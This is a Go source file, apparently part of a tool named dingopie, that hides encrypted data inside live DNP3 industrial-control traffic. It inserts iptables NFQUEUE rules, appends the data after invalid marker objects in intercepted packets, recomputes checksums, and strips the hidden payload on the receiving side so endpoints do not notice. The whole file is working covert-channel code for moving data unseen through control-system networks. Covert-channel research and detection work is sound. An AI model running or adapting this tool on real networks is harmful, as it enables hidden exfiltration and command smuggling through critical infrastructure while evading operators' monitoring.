//go:build !windows

// Package inject sends data on top of an existing DNP3 connection. The sender waits for outgoing or transiting
// packets, and modifies it, adding an invalid data object to mark the start of its message, and then as many bytes of
// data as can fit in the frame. On the other side, the receiver scans incoming messages for these special data
// objects, and strips them and any following data before forwarding the packet to its intended destination. The
// specific data object that is added can take one of three forms, signaling the size of data to follow, send data,
// or disconnect (all data sent). This scheme is identical regardless of the direction: both master and outstation
// append the same data objects.
//
// The sequence of messages is as follows:
//
//		(sender)-- G0V0QFA + size -->(receiver)	Initiate connection
//	Loop:
//		(sender)-- G0V0QFC + data -->(receiver)	Send Data
//		...
//	End:
//		(sender)-- G0V0QFD        -->(receiver)	Disconnect
//
// In each instance above, a legitimate DNP3 messages is coming into the sender, being modified with the extra data,
// and then being forwarded onto the receiver which strips this data. The sender and receiver can either intercept
// packets as they leave a device (i.e. running on anoutstation or master), or they can run on network infrastructure
// that carries DNP3 traffic. In the second case, dingopie inject can even multiplex its data transfer over many DNP3
// connections to increase the throughput. Although in this instance, TCP out-of-order fuckery may impact reliability.
package inject

import (
	"bytes"
	"context"
	"crypto/cipher"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/coreos/go-iptables/iptables"
	nfqueue "github.com/florianl/go-nfqueue"
	"github.com/google/gopacket"
	"github.com/nblair2/dingopie/internal"
	"github.com/nblair2/go-dnp3/dnp3"
	"github.com/schollz/progressbar/v3"
)

const (
	injectRuleNumber int    = 1
	injectQueue      uint16 = 1

	dnp3HeaderLen  = 10 // 8-byte DL header + 2-byte CRC
	maxDNP3Length  = 255
	markerLen      = 3
	sizePayloadLen = 4 // big-endian uint32
)

var (
	sizeMarker   = []byte{0x00, 0x00, 0xFA}
	injectMarker = []byte{0x00, 0x00, 0xFC}
	endMarker    = []byte{0x00, 0x00, 0xFD}
)

// ==================================================================
// COMMON
// ==================================================================

type forwardInfo struct {
	payload      []byte
	responseChan chan []byte
}

func inject(
	out io.Writer,
	rule *FirewallRule,
	fwdFunc func(*forwardInfo) error,
	done chan struct{},
) error {
	sigChan := make(chan os.Signal, 1)

	signal.Notify(sigChan, syscall.SIGINT)
	defer signal.Stop(sigChan)

	err := addFirewallRule(rule)
	if err != nil {
		return fmt.Errorf("error creating firewall rule: %w", err)
	}

	defer deleteFirewallRule(rule)

	fmt.Fprintf(out, ">> Intercepting traffic\n")

	pktChan := make(chan forwardInfo, 1)

	go newNFQueueToChan(injectQueue, pktChan)
	go newChanToFunc(pktChan, fwdFunc)

	select {
	case <-sigChan:
	case <-done:
	}

	return nil
}

func newNFQueueToChan(que uint16, forward chan forwardInfo) {
	//nolint: exhaustruct // Use defaults
	config := nfqueue.Config{
		NfQueue:      que,
		MaxPacketLen: 0xFFFF,
		MaxQueueLen:  0xFF,
		Copymode:     nfqueue.NfQnlCopyPacket,
		WriteTimeout: time.Second,
	}

	nf, err := nfqueue.Open(&config)
	if err != nil {
		return
	}

	defer nf.Close()

	fwdFunc := func(a nfqueue.Attribute) int {
		response := make(chan []byte, 1)
		fwd := forwardInfo{
			payload:      *a.Payload,
			responseChan: response,
		}

		forward <- fwd

		resp := <-response

		err = nf.SetVerdictModPacket(*a.PacketID, nfqueue.NfAccept, resp)
		if err != nil {
			fmt.Printf("Error setting verdict: %v\n", err)
		}

		return 0
	}

	errFunc := func(e error) int { return 1 }

	err = nf.RegisterWithErrorFunc(context.Background(), fwdFunc, errFunc)
	if err != nil {
		return
	}

	// Block until the nfqueue loop exits on error or shutdown.
	select {}
}

func newChanToFunc(forward chan forwardInfo, fwdFunc func(*forwardInfo) error) {
	for fwd := range forward {
		err := fwdFunc(&fwd)
		if err != nil {
			fmt.Printf("Error in forward function: %v\n", err)
		}

		fwd.responseChan <- fwd.payload
	}
}

// ==================================================================
// SEND
// ==================================================================

type sendState struct {
	encSize   []byte
	remaining []byte
	sizeSent  bool
	isDone    bool
	bar       *progressbar.ProgressBar
	out       io.Writer
	done      chan struct{}
}

func newSendState(out io.Writer, data []byte, key string, done chan struct{}) (*sendState, error) {
	if uint64(len(data)) > math.MaxUint32 {
		return nil, fmt.Errorf(
			"data length %d exceeds maximum of %d bytes", len(data), uint32(math.MaxUint32),
		)
	}

	//nolint:gosec // G115: len guarded by math.MaxUint32 check above
	originalLen := uint32(len(data))

	stream := internal.NewCipherStream(key)

	encSize := make([]byte, sizePayloadLen)
	binary.BigEndian.PutUint32(encSize, originalLen)
	stream.XORKeyStream(encSize, encSize)

	enc := make([]byte, len(data))
	stream.XORKeyStream(enc, data)

	bar := internal.NewProgressBar(out, int(originalLen), "\tSending:\t")

	return &sendState{
		encSize:   encSize,
		remaining: enc,
		sizeSent:  false,
		isDone:    false,
		bar:       bar,
		out:       out,
		done:      done,
	}, nil
}

func (s *sendState) process(fwd *forwardInfo) error {
	if s.isDone {
		return nil
	}

	if !s.sizeSent {
		sent, err := trySendSizePacket(fwd, s.encSize)
		if err != nil {
			return err
		}

		s.sizeSent = sent

		return nil
	}

	if len(s.remaining) > 0 {
		newPkt, consumed, err := injectIntoPacket(fwd.payload, s.remaining, injectMarker)
		if err != nil {
			return fmt.Errorf("injectIntoPacket (data): %w", err)
		}

		if consumed > 0 {
			fwd.payload = newPkt
			s.remaining = s.remaining[consumed:]
			s.bar.Add(consumed)
		}

		return nil
	}

	// All data sent — inject end marker on the next DNP3 packet with room.
	sent, err := trySendEndPacket(fwd)
	if err != nil {
		return err
	}

	if !sent {
		return nil
	}

	s.isDone = true

	s.bar.Finish()
	fmt.Fprintf(s.out, ">> All data sent, removing firewall rule\n")
	close(s.done)

	return nil
}

// ==================================================================
// RECEIVE
// ==================================================================

type recvState struct {
	stream      cipher.Stream
	gotSize     bool
	originalLen uint32
	collected   []byte
	bar         *progressbar.ProgressBar
	out         io.Writer
	done        chan struct{}
	result      *[]byte
}

func newRecvState(out io.Writer, key string, result *[]byte, done chan struct{}) *recvState {
	return &recvState{
		stream: internal.NewCipherStream(key),
		out:    out,
		done:   done,
		result: result,
	}
}

func (r *recvState) process(fwd *forwardInfo) error {
	kind, payload, cleaned, err := extractFromPacket(fwd.payload)
	if err != nil {
		return fmt.Errorf("extractFromPacket: %w", err)
	}

	fwd.payload = cleaned

	switch kind { //nolint:exhaustive // markerNone is a no-op pass-through
	case markerSize:
		if len(payload) < sizePayloadLen {
			return fmt.Errorf("size marker payload too short: %d bytes", len(payload))
		}

		dec := make([]byte, sizePayloadLen)
		r.stream.XORKeyStream(dec, payload[:sizePayloadLen])
		r.originalLen = binary.BigEndian.Uint32(dec)
		r.gotSize = true
		r.bar = internal.NewProgressBar(r.out, int(r.originalLen), "\tReceiving:\t")

	case markerData:
		dec := make([]byte, len(payload))
		r.stream.XORKeyStream(dec, payload)
		r.collected = append(r.collected, dec...)

		if r.bar != nil {
			r.bar.Add(len(dec))
		}

	case markerEnd:
		received := r.collected
		//nolint:gosec // G115: len bounded by originalLen (uint32)
		if r.gotSize && uint32(len(received)) > r.originalLen {
			received = received[:r.originalLen]
		}

		*r.result = received

		if r.bar != nil {
			r.bar.Finish()
		}

		fmt.Fprintf(r.out, ">> Data receive complete, removing firewall rule\n")
		close(r.done)
	}

	return nil
}

// ==================================================================
// Exported functions
// ==================================================================

func ClientInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	recv := newRecvState(out, key, &received, done)
	err := inject(out, rule, recv.process, done)

	return received, err
}

func ServerInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	send, err := newSendState(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, send.process, done)
}

func ClientInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	send, err := newSendState(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, send.process, done)
}

func ServerInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	recv := newRecvState(out, key, &received, done)
	err := inject(out, rule, recv.process, done)

	return received, err
}

// ==================================================================
// Firewall helpers
// ==================================================================

// FirewallRule holds the parameters for a single iptables NFQUEUE rule.
type FirewallRule struct {
	table       string
	chain       string
	number      int
	que         uint16
	source      string
	destination string
	srcPort     int
	destPort    int
}

func newFirewallRule(
	table, chain string,
	source, destination string,
	srcPort, destPort int,
) *FirewallRule {
	return &FirewallRule{
		table:       table,
		chain:       chain,
		number:      injectRuleNumber,
		que:         injectQueue,
		source:      source,
		destination: destination,
		srcPort:     srcPort,
		destPort:    destPort,
	}
}

// newSendRule intercepts packets leaving this host (POSTROUTING).
func newSendRule(local, remote string, localPort, remotePort int) *FirewallRule {
	return newFirewallRule("mangle", "POSTROUTING", local, remote, localPort, remotePort)
}

// newRecvRule intercepts packets arriving at this host (PREROUTING).
func newRecvRule(local, remote string, localPort, remotePort int) *FirewallRule {
	return newFirewallRule("mangle", "PREROUTING", remote, local, remotePort, localPort)
}

// ToArgs converts the rule into iptables argument strings.
func (r *FirewallRule) ToArgs() []string {
	var args []string

	if r.source != "" {
		args = append(args, "--source", r.source)
	}

	if r.destination != "" {
		args = append(args, "--destination", r.destination)
	}

	args = append(args, "--protocol", "tcp")

	if r.srcPort != 0 {
		args = append(args, "--sport", strconv.Itoa(r.srcPort))
	}

	if r.destPort != 0 {
		args = append(args, "--dport", strconv.Itoa(r.destPort))
	}

	args = append(args, "--jump", "NFQUEUE", "--queue-num", strconv.FormatUint(uint64(r.que), 10))

	return args
}

func addFirewallRule(rule *FirewallRule) error {
	ipt, err := iptables.New()
	if err != nil {
		return fmt.Errorf("failed to create iptables instance: %w", err)
	}

	err = ipt.Insert(rule.table, rule.chain, rule.number, rule.ToArgs()...)
	if err != nil {
		return fmt.Errorf("failed to insert iptables rule: %w", err)
	}

	return nil
}

func deleteFirewallRule(rule *FirewallRule) error {
	ipt, err := iptables.New()
	if err != nil {
		return fmt.Errorf("failed to create iptables instance: %w", err)
	}

	err = ipt.DeleteIfExists(rule.table, rule.chain, rule.ToArgs()...)
	if err != nil {
		return fmt.Errorf("failed to delete iptables rule: %w", err)
	}

	return nil
}

// ==================================================================
// Packet manipulation helpers
// ==================================================================

// findDNP3InIPPacket parses a raw IPv4 packet and returns the IP header length
// and TCP header length. Returns error if the packet is not IPv4/TCP or does
// not carry a DNP3 frame (magic bytes 0x05 0x64).
func findDNP3InIPPacket(pkt []byte) (int, int, error) {
	if len(pkt) < 20 {
		return 0, 0, errors.New("packet too short for IPv4 header")
	}

	if pkt[0]>>4 != 4 {
		return 0, 0, errors.New("not an IPv4 packet")
	}

	if pkt[9] != 6 {
		return 0, 0, errors.New("not a TCP packet")
	}

	ipHdrLen := int(pkt[0]&0x0F) * 4
	if len(pkt) < ipHdrLen+20 {
		return 0, 0, errors.New("packet too short for TCP header")
	}

	tcpHdrLen := int(pkt[ipHdrLen+12]>>4) * 4
	dnp3Start := ipHdrLen + tcpHdrLen

	if len(pkt) < dnp3Start+2 {
		return 0, 0, errors.New("packet too short for DNP3 magic bytes")
	}

	if pkt[dnp3Start] != 0x05 || pkt[dnp3Start+1] != 0x64 {
		return 0, 0, errors.New("DNP3 magic bytes not found")
	}

	return ipHdrLen, tcpHdrLen, nil
}

// dnp3FrameEnd returns the index one past the last byte of the first DNP3
// frame in pkt starting at dnp3Start. Returns -1 if the frame is truncated.
func dnp3FrameEnd(pkt []byte, dnp3Start int) int {
	if len(pkt) < dnp3Start+3 {
		return -1
	}

	lengthByte := int(pkt[dnp3Start+2])
	if lengthByte < 5 {
		return -1
	}

	payloadLen := lengthByte - 5
	numBlocks := (payloadLen + 15) / 16
	end := dnp3Start + 10 + payloadLen + numBlocks*2

	if end > len(pkt) {
		return -1
	}

	return end
}

// calcIPChecksum computes the ones-complement 16-bit checksum over an IP header.
func calcIPChecksum(hdr []byte) uint16 {
	var sum uint32

	for i := 0; i+1 < len(hdr); i += 2 {
		sum += uint32(hdr[i])<<8 | uint32(hdr[i+1])
	}

	if len(hdr)%2 != 0 {
		sum += uint32(hdr[len(hdr)-1]) << 8
	}

	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

// calcTCPChecksum computes the TCP checksum using the IPv4 pseudo-header.
func calcTCPChecksum(pkt []byte, ipHdrLen int) uint16 {
	tcpSeg := pkt[ipHdrLen:]
	tcpLen := uint16(len(tcpSeg)) //nolint:gosec // G115: TCP length bounded by IPv4 max (65535)

	// pseudo-header: src IP, dst IP, zero, proto=6, TCP length
	pseudo := make([]byte, 12)
	copy(pseudo[0:4], pkt[12:16]) // source IP
	copy(pseudo[4:8], pkt[16:20]) // dest IP
	pseudo[8] = 0
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:], tcpLen)

	var sum uint32

	for i := 0; i+1 < len(pseudo); i += 2 {
		sum += uint32(pseudo[i])<<8 | uint32(pseudo[i+1])
	}

	for i := 0; i+1 < len(tcpSeg); i += 2 {
		sum += uint32(tcpSeg[i])<<8 | uint32(tcpSeg[i+1])
	}

	if len(tcpSeg)%2 != 0 {
		sum += uint32(tcpSeg[len(tcpSeg)-1]) << 8
	}

	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

// rebuildChecksums updates the IP total-length, IP checksum, and TCP checksum
// after the packet has been resized.
func rebuildChecksums(pkt []byte, ipHdrLen int) {
	//nolint:gosec // G115: pkt bounded by nfqueue MaxPacketLen (0xFFFF)
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	pkt[10] = 0
	pkt[11] = 0
	cs := calcIPChecksum(pkt[:ipHdrLen])
	binary.BigEndian.PutUint16(pkt[10:], cs)

	pkt[ipHdrLen+16] = 0
	pkt[ipHdrLen+17] = 0
	tcs := calcTCPChecksum(pkt, ipHdrLen)
	binary.BigEndian.PutUint16(pkt[ipHdrLen+16:], tcs)
}

// injectIntoPacket appends marker+covertData to the DNP3 application payload
// within the raw IP packet. Returns the modified packet and how many covert
// bytes were consumed. Returns the original packet unchanged (consumed=0) if
// the packet is not IPv4/TCP/DNP3 or if there is no room.
func injectIntoPacket(pkt, covertData, marker []byte) ([]byte, int, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return pkt, 0, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen

	frameEnd := dnp3FrameEnd(pkt, dnp3Start)
	if frameEnd < 0 {
		return pkt, 0, nil
	}

	frame, err := dnp3.NewFrameFromBytes(pkt[dnp3Start:frameEnd])
	if err != nil || frame.Application == nil {
		return pkt, 0, nil
	}

	available := maxDNP3Length - int(frame.DataLink.Length)
	if available <= markerLen {
		return pkt, 0, nil
	}

	toSend := min(len(covertData), available-markerLen)

	appData := frame.Application.GetData()
	extra := make([]byte, 0, markerLen+toSend)
	extra = append(extra, marker...)
	extra = append(extra, covertData[:toSend]...)
	appData.SetExtra(extra)
	frame.Application.SetData(appData)

	buf := gopacket.NewSerializeBuffer()
	if err := frame.SerializeTo(buf, gopacket.SerializeOptions{}); err != nil {
		return pkt, 0, fmt.Errorf("SerializeTo: %w", err)
	}

	newPkt := make([]byte, dnp3Start+len(buf.Bytes()))
	copy(newPkt, pkt[:dnp3Start])
	copy(newPkt[dnp3Start:], buf.Bytes())

	rebuildChecksums(newPkt, ipHdrLen)

	return newPkt, toSend, nil
}

// markerType classifies what was found in a packet's DNP3 application payload.
type markerType int

const (
	markerNone markerType = iota
	markerSize
	markerData
	markerEnd
)

// extractFromPacket scans the DNP3 application payload for a covert marker.
// Returns the marker type, bytes after the marker, and a cleaned packet with
// the marker and everything after it removed. Returns markerNone with the
// original packet if no marker is found.
func extractFromPacket(pkt []byte) (markerType, []byte, []byte, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return markerNone, nil, pkt, nil //nolint:nilerr // non-DNP3 passes through
	}

	dnp3Start := ipHdrLen + tcpHdrLen

	frameEnd := dnp3FrameEnd(pkt, dnp3Start)
	if frameEnd < 0 {
		return markerNone, nil, pkt, nil
	}

	// DecodeFromBytes errors when it hits G0V0 (our marker), but Application
	// is still set with the valid objects in Objects and our marker in extra.
	frame := dnp3.NewFrame()
	_ = frame.DecodeFromBytes(pkt[dnp3Start:frameEnd], gopacket.NilDecodeFeedback)

	if frame.Application == nil {
		return markerNone, nil, pkt, nil
	}

	appData := frame.Application.GetData()
	extra := appData.GetExtra()

	if len(extra) < markerLen {
		return markerNone, nil, pkt, nil
	}

	var kind markerType

	switch {
	case bytes.Equal(extra[:markerLen], sizeMarker):
		kind = markerSize
	case bytes.Equal(extra[:markerLen], injectMarker):
		kind = markerData
	case bytes.Equal(extra[:markerLen], endMarker):
		kind = markerEnd
	default:
		return markerNone, nil, pkt, nil
	}

	payload := extra[markerLen:]

	// Rebuild a clean frame with the covert data stripped.
	appData.SetExtra(nil)
	frame.Application.SetData(appData)

	buf := gopacket.NewSerializeBuffer()
	if err := frame.SerializeTo(buf, gopacket.SerializeOptions{}); err != nil {
		return markerNone, nil, pkt, fmt.Errorf("SerializeTo: %w", err)
	}

	cleanPkt := make([]byte, dnp3Start+len(buf.Bytes()))
	copy(cleanPkt, pkt[:dnp3Start])
	copy(cleanPkt[dnp3Start:], buf.Bytes())

	rebuildChecksums(cleanPkt, ipHdrLen)

	return kind, payload, cleanPkt, nil
}

// trySendSizePacket attempts to inject the encrypted size into fwd. Returns true if injected,
// false if the packet has no room yet or is not DNP3.
func trySendSizePacket(fwd *forwardInfo, encSize []byte) (bool, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(fwd.payload)
	if err != nil {
		return false, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(fwd.payload) < dnp3Start+3 {
		return false, nil
	}

	available := maxDNP3Length - int(fwd.payload[dnp3Start+2])
	if available < markerLen+sizePayloadLen {
		return false, nil // not enough room, wait for next packet
	}

	newPkt, _, err := injectIntoPacket(fwd.payload, encSize, sizeMarker)
	if err != nil {
		return false, fmt.Errorf("injectIntoPacket (size): %w", err)
	}

	fwd.payload = newPkt

	return true, nil
}

// trySendEndPacket attempts to inject the end marker into fwd. Returns true if injected,
// false if the packet has no room or is not DNP3.
func trySendEndPacket(fwd *forwardInfo) (bool, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(fwd.payload)
	if err != nil {
		return false, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(fwd.payload) < dnp3Start+dnp3HeaderLen {
		return false, nil
	}

	available := maxDNP3Length - int(fwd.payload[dnp3Start+2])
	if available <= markerLen {
		return false, nil // not enough room, wait for next packet
	}

	newPkt, _, err := injectIntoPacket(fwd.payload, nil, endMarker)
	if err != nil {
		return false, fmt.Errorf("injectIntoPacket (end): %w", err)
	}

	fwd.payload = newPkt

	return true, nil
}
